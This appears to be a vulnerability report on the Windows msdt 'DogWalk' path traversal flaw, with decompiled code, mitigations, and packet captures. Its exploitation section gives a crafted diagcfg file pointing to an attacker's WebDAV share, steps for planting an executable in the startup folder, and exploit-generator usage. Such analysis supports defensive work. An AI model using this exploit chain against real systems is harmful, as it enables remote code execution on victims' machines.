@@ -1,0 +1,302 @@
+---
+eip: IGNORE
+report_version: 1.0
+---
+
+# Summary
+
+[//]: # (ENDIF)
+
+* A path traversal vulnerability has been reported in Microsoft Windows Support Diagnostic Tool (msdt.exe) prior to KB5016616.
+* The vulnerability occurs within SdpCopyDirectory in sdiaeng.dll when processing user controlled filenames.
+* The network-based attack vector involves crafting a malicious diagcab file.
+* A remote anonymous attacker can exploit this vulnerability to achieve code execution.
+* Network-based detection can be performed by analyzing filenames to check if they contain invalid characters.
+
+## Affected Software
+
+This vulnerability affects the following versions of Microsoft Windows:
+* Windows 11
+* Windows 10 v21H2
+* Windows 10 v21H1
+* Windows 10 v20H2
+* Windows 10 v2004
+* Windows 10 v1909
+* Windows 10 v1903
+* Windows 10 v1809
+* Windows 10 v1803
+* Windows 7
+* Windows Server 2008 R2
+* Windows Server 2012
+* Windows Server 2012 R2
+* Windows Server 2016
+* Windows Server 2019 
+* Windows Server 2022 
+
+## Product Background
+Windows is a group of several proprietary graphical operating system families developed and marketed by Microsoft.
+The Microsoft Support Diagnostic Tool (MSDT) is a service in Microsoft Windows that allows Microsoft technical support agents to analyze diagnostic data remotely for troubleshooting purposes.
+
+## Attack Delivery
+
+[//]: # (IF FILE-BASED-ATTACK)
+
+This vulnerability can be exploited by a file-based attack vector with the following characteristics:
+
+* File formats: `DIAGCAB`
+* File extensions :  `.diagcab`
+* MIME Types: `applictaion/bin`
+
+These files are typically transported over the network using the following protocols:
+
+* Application layer: `HTTP`,`HTTPS`
+* Transport layer: `80/TCP`,`443/TCP`
+* Encryption: Optional
+
+[//]: # (ENDIF)
+
+## Mitigation
+
+Potential impacts of this vulnerability can be mitigated by:
+
+* Upgrading to the patched version.
+* Sanitizing filenames based on Windows file naming guidelines.
+
+# Vulnerability
+
+[//]: # (IF DECOMPILED)
+
+All code listings shown within this section show decompiled C code; source code is not available in the affected product.
+Structure definitions are obtained by reverse engineering and may not accurately reflect structures defined in the source code.
+
+A path traversal vuilnerability exists in Microsoft Windows Support Diagnostic Tool.
+
+The vulnerability analysis that follows is based on:
+* `sdiageng.dll` 
+
+Unless otherwise specified, code blocks and references to the affected components of the application are based on the aforementioned version(s).
+
+## Preliminaries
+
+The Scripted Diagnostics Execution Engine `sdiageng.dll` is used by `msdt.exe` to run troubleshooting routines and execute external diagnostic packages.
+
+* `SdpCopyDirectory` function contains the vulnerability. It's functionality involves copying all files residing in the external directory pointed to by the diagnostic cabinet file to a temporary directory in its system.
+* Diagcab files are run using `msdt.exe`. diagcfg files, that are packaged inside the diagcab files, contain xml data that hold reference to one or more diagnostic packages and provide meta information about them.
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<PackageConfiguration xmlns="http://www.microsoft.com/schemas/dcm/configuration/2008">
+  <Execution>
+    <Package Path="\\172.20.74.88@8001\DavWWWRoot\use" />
+    <Name>Some name</Name>
+    <Description>Some description</Description>
+    <Icon>@%windir%\diagnostics\system\WindowsUpdate\DiagPackage.dll,-1001</Icon>
+  </Execution>
+
+  <Index>
+    <Id>Custom</Id>
+    <RequiresAdminPrivileges>false</RequiresAdminPrivileges>
+    <PrivacyUrl>http://go.microsoft.com/fwlink/?LinkId=190175</PrivacyUrl>
+    <Version>1.0</Version>
+    <PublisherName>Microsoft Corporation</PublisherName>
+    <Category>@%windir%\system32\DiagCpl.dll,-412</Category>
+    <Keyword>@%windir%\system32\DiagCpl.dll,-27</Keyword>
+  </Index>
+</PackageConfiguration>
+```
+* The path attribute of the `diagcfg` file can be used to send user controlled directory locations from where `msdt.exe` can download required files from.
+* The copied files are stored in a local temporary directory like `C:\Windows\Temp`.
+
+## Technical Details
+
+The `SdpCopyDirectory()` function is responsible for copying files from a specified location to a temporary directory for signature verification. If the verification is correct, the user proceeds with the wizard on the GUI and embedded powershell scripts are executed under the hood.
+Since the data source is controlled by the attacker and network file systems are supported by the Windows OS natively, this pattern can be exploited before the integrity check has the chance to detect the malformed package. A rogue, network attached file system can gain controlled write over the destination file system by returning `..\..` components in the file name.
+
+## Code Analysis
+
+```c 
+int SdpCopyDirectory(const unsigned __int16 *a1, const unsigned __int16 *a2)
+{
+[Truncated]
+
+  search_handle = (char *)FindFirstFileW(src, &FindFileData);
+  if ( (unsigned __int64)(search_handle - 1) <= 0xFFFFFFFFFFFFFFFDui64 )
+  {
+    do
+    {
+      if ( (FindFileData.dwFileAttributes & 0x10) == 0 )
+      {
+[1]     result = StringCchPrintfW(src, 260i64, L"%s\\%s", a1, FindFileData.cFileName);
+        v7 = result;
+        if ( result < 0 )
+        {
+          v11 = 1917;
+LABEL_27:
+          v10 = result;
+LABEL_28:
+          SdpDebugTrace(1u, L"SdpCopyDirectory", v11, v10);
+          break;
+        }
+[2]      result = StringCchPrintfW(dest, 260i64, L"%s\\%s", a2, FindFileData.cFileName);
+        v7 = result;
+        if ( result < 0 )
+        {
+          v11 = 1924;
+          goto LABEL_27;
+        }
+[3]     if ( CopyFileW(src, dest, 1) )
+        {
+          v7 = 0;
+        }
+        else
+            [Truncated]
+          }
+        }
+      }
+    }
+    while ( FindNextFileW(search_handle, &FindFileData) );
+  }
+[Truncated]
+
+```
+The function finds all the files present in the specified directory using `FindFirstFileW()` and `FindNextFileW()` methods. The filenames are then concatenated to the source and destination paths described by the variables `src` and `dest` as seen at [1] and [2].
+at [3] `CopyFileW()` is used to copy the file from the attacker controlled path to the local temp storage like `C:\Windows\Temp`. Note that the function assumes all filenames to be valid as per windows guidelines and does not perform any checks to verify this assumption.
+
+## Open Questions
+
+No open questions are noted at the time of writing.
+
+# Exploitation
+
+An exploit is included with this report, it consists of a malicious diagcab archive.
+
+## Requirements
+
+* A vulnerable instance of Microsoft Windows must be configured and running.
+* The attacker must be able entice a user to open a crafted file.
+* A WebDAV server must be hosted by the attacker to store the malicious files.
+
+## Exploit Mechanism
+
+Exploiting this involves the following steps:
+* Setting up a WebDAV server to host malicious files.
+* Generate the diagcab archive with the path attribute set to the directory containing the malicious executable on the WebDAV server.
+* The vulnerability is triggered  when it copies a filename having special characters used in path traversal, like `..\..\..\ProgramData\Microsoft`
+
+Note that a directory having the crafted path must be present in the WebDAV share for windows to find the source.
+## Exploit Reproduction
+
+In order to reproduce this vulnerability:
+1. Setup an instance of the vulnerable version of Windows.
+2. Make sure Windows can access remote file shares.
+3. Setup a WebDAV server with the payload executable having the modified name.
+4. run `generate.py` to create the crafted diagcab package that points to the directory of the payload in the WebDAV share.
+5. double click the diagcab archive to trigger the vulnerability which places the executable in the startup directory.
+
+```bash=
+$ python3 generate.py -h
+usage: generate.py [-h] url
+
+    --------------------------
+     Exodus Intelligence LLC.
+       All Rights Reserved.
+    --------------------------
+    File generator for CVE-2022-34713 'DogWalk' that exploits a path traversal vulnerability in sdigeng.dll.
+    The exploit places a custom executable in the startup directory of the vulnerable machine.
+
+
+positional arguments:
+  url         url to the WebDAV share containing the payload. Example - \localhost@80\DavWWWRoot\directory
+
+optional arguments:
+  -h, --help  show this help message and exit
+
+$ python3 generate.py "\\localhost@80\DavWWWRoot\exp"
+
+        CVE-2022-34713; Microsoft Diagnostic Tool - Dogwalk Exploit
+
+File generated @ gen.diagcfg
+```
+
+```cmd=
+
+> cabarc.exe n exploit.diagcab gen.diagcfg
+
+Microsoft (R) Cabinet Tool - Version 1.00
+Copyright (c) Microsoft Corp 1996. All rights reserved.
+
+Creating new cabinet 'exploit.diagcab':
+  -- adding gen.diagcfg
+
+Completed successfully 
+```
+
+
+
+## Public Exploit
+`irsl`  has released an exploit targeting this vulnerability.[^public-exploit]
+
+[^public-exploit]: [CVE-2022-34713 public exploit](https://github.com/irsl/microsoft-diagcab-rce-poc)
+
+# Traffic
+Included with this report are the following pcaps:
+* benign.pcap: This PCAP was generated normally by passing a diagcab file having a valid filename in the PATH attribute.
+* malicious.pcap: This PCAP was generated by passing a diagcab file having an invalid filename in the PATH attribute.
+
+## Benign Traffic
+The following packet decode shows benign traffic. Reference markers denoted by [N] are included at certain relevant offsets. Some lines have been truncated and replaced by a [Truncated] marker.
+```
+
+0000   00 15 5d 79 85 f3 00 15 5d a2 8c 83 08 00 45 00   ..]y....].....E.
+0010   00 df 1d 4e 40 00 80 06 03 0e ac 14 40 01 ac 14   ...N@.......@...
+0020   41 93 db 47 00 50 58 22 26 5a a2 24 c5 c8 50 18   A..G.PX"&Z.$..P.
+
+[1]
+
+0030   20 14 c9 e7 00 00 47 45 54 20 2f 75 73 65 2f 63    .....GET /use/c
+0040   61 6c 63 2e 65 78 65 20 48 54 54 50 2f 31 2e 31   alc.exe HTTP/1.1
+0050   0d 0a 43 61 63 68 65 2d 43 6f 6e 74 72 6f 6c 3a   ..Cache-Control:
+0060   20 6e 6f 2d 63 61 63 68 65 0d 0a 43 6f 6e 6e 65    no-cache..Conne
+0070   63 74 69 6f 6e 3a 20 4b 65 65 70 2d 41 6c 69 76   ction: Keep-Aliv
+0080   65 0d 0a 50 72 61 67 6d 61 3a 20 6e 6f 2d 63 61   e..Pragma: no-ca
+0090   63 68 65 0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a   che..User-Agent:
+00a0   20 4d 69 63 72 6f 73 6f 66 74 2d 57 65 62 44 41    Microsoft-WebDA
+00b0   56 2d 4d 69 6e 69 52 65 64 69 72 2f 31 30 2e 30   V-MiniRedir/10.0
+00c0   2e 31 39 30 34 33 0d 0a 74 72 61 6e 73 6c 61 74   .19043..translat
+00d0   65 3a 20 66 0d 0a 48 6f 73 74 3a 20 31 37 32 2e   e: f..Host: 172.
+00e0   32 30 2e 36 35 2e 31 34 37 0d 0a 0d 0a            20.65.147....
+
+```
+The above decode shows a normal HTTP GET request [1] containing the file name that is downloaded by the victim machine.
+
+## Malicious Traffic
+The following packet decode shows malicious traffic. Reference markers denoted by [N] are included at certain relevant offsets. Some lines have been truncated and replaced by a [Truncated] marker.
+
+```
+0000   00 15 5d 79 85 f3 00 15 5d a2 8c 83 08 00 45 00   ..]y....].....E.
+0010   00 f1 24 17 40 00 80 06 fc 32 ac 14 40 01 ac 14   ..$.@....2..@...
+0020   41 93 f2 c2 00 50 8e d1 58 58 ff b1 cb 9c 50 18   A....P..XX....P.
+
+[1]
+
+0030   20 14 80 c0 00 00 47 45 54 20 2f 50 72 6f 67 72    .....GET /Progr
+0040   61 6d 44 61 74 61 2f 4d 69 63 72 6f 73 6f 66 74   amData/Microsoft
+0050   2f 63 61 6c 63 2e 65 78 65 20 48 54 54 50 2f 31   /calc.exe HTTP/1
+0060   2e 31 0d 0a 43 61 63 68 65 2d 43 6f 6e 74 72 6f   .1..Cache-Contro
+0070   6c 3a 20 6e 6f 2d 63 61 63 68 65 0d 0a 43 6f 6e   l: no-cache..Con
+0080   6e 65 63 74 69 6f 6e 3a 20 4b 65 65 70 2d 41 6c   nection: Keep-Al
+0090   69 76 65 0d 0a 50 72 61 67 6d 61 3a 20 6e 6f 2d   ive..Pragma: no-
+00a0   63 61 63 68 65 0d 0a 55 73 65 72 2d 41 67 65 6e   cache..User-Agen
+00b0   74 3a 20 4d 69 63 72 6f 73 6f 66 74 2d 57 65 62   t: Microsoft-Web
+00c0   44 41 56 2d 4d 69 6e 69 52 65 64 69 72 2f 31 30   DAV-MiniRedir/10
+00d0   2e 30 2e 31 39 30 34 33 0d 0a 74 72 61 6e 73 6c   .0.19043..transl
+00e0   61 74 65 3a 20 66 0d 0a 48 6f 73 74 3a 20 31 37   ate: f..Host: 17
+00f0   32 2e 32 30 2e 36 35 2e 31 34 37 0d 0a 0d 0a      2.20.65.147....
+
+```
+
+The above decode shows the traffic generated during the HTTP GET request [1] performed by a crafted diagcab archive containing the crafted file name that is downloaded by the victim machine.
+
+# Detection
+
+This section is not yet available.
+
